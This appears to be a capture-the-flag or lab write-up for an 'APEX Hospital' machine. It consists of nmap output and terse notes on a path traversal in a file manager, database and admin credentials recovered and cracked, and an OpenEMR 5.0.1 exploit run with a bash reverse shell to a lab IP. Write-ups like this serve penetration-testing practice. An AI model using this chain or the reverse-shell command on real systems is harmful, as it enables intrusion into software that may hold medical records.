80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: APEX Hospital
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 34
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, LongPassword, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, ODBCClient, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: y8F8(\v]OS3C7-v0)|Y(
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: APEX

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: apex
|   NetBIOS computer name: APEX\x00
|   Domain name: \x00
|   FQDN: apex
|_  System time: 2026-07-28T08:19:53-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-28T12:19:55
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s


445
<img width="770" height="349" alt="image" src="https://github.com/user-attachments/assets/e0567a82-5d96-4a35-82c9-48e0617cdf34" />

80
possible usernames
<img width="1291" height="761" alt="image" src="https://github.com/user-attachments/assets/a90f04ea-361d-4435-971f-fd4cffed9d81" />
<img width="186" height="121" alt="image" src="https://github.com/user-attachments/assets/49d3fd9a-4664-423a-ae3f-507f648ca702" />

found /filemanger
<img width="916" height="362" alt="image" src="https://github.com/user-attachments/assets/5f091595-7526-442a-8a19-59343390ea23" />
<img width="523" height="221" alt="image" src="https://github.com/user-attachments/assets/25aa477b-f9b1-48de-840e-9ab326d99dc2" />

perfect path traversal exploit
https://www.exploit-db.com/exploits/49359

get phpsessid from inspect
<img width="924" height="569" alt="image" src="https://github.com/user-attachments/assets/c1efa6a0-221b-445e-951c-78e843a4df33" />

found /openemr/admin.php, running openEMR 5.0.1
<img width="1303" height="334" alt="image" src="https://github.com/user-attachments/assets/f3e9925e-9b8d-40c1-b196-910fe9ae1d0c" />

github shows default password of sql conf path
<img width="777" height="609" alt="image" src="https://github.com/user-attachments/assets/642bc8ea-9818-416c-a912-803b835c8e5b" />

change to paste to /documents
<img width="503" height="69" alt="image" src="https://github.com/user-attachments/assets/d433d5c9-5b0c-4441-965f-75dc13c37ef8" />

retrieve from smb 
<img width="841" height="205" alt="image" src="https://github.com/user-attachments/assets/a283bf1e-c839-4226-865f-0a46ff81554a" />

open sqlconf. openemr:C78maEQUIEuQ
<img width="251" height="185" alt="image" src="https://github.com/user-attachments/assets/57b7f8d3-f3e4-45a4-a25e-74c0ada25bd4" />

logged in sql
<img width="670" height="206" alt="image" src="https://github.com/user-attachments/assets/8d3a2e1c-2a8a-4397-a18f-559e79ae77d0" />

found hash for admin
<img width="1692" height="137" alt="image" src="https://github.com/user-attachments/assets/5a3d2e08-6ead-4397-91cd-7722486a7c0f" />

cracked. admin:thedoctor
<img width="784" height="194" alt="image" src="https://github.com/user-attachments/assets/2365c2b3-6b69-45c9-96d8-7400313551fd" />

logged in to openemr
<img width="1909" height="679" alt="image" src="https://github.com/user-attachments/assets/ff61860e-d44d-4b70-9551-4670a4591a38" />

python2 45161.py http://192.168.136.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.215/4444 0>&1'
<img width="603" height="70" alt="image" src="https://github.com/user-attachments/assets/f2026f6b-e9d3-4807-8e78-2c42aaf35f21" />

root pass is also thedoctor.... omygod
<img width="414" height="40" alt="image" src="https://github.com/user-attachments/assets/12ff9125-7385-4b70-94d5-0959c6e3feaf" />
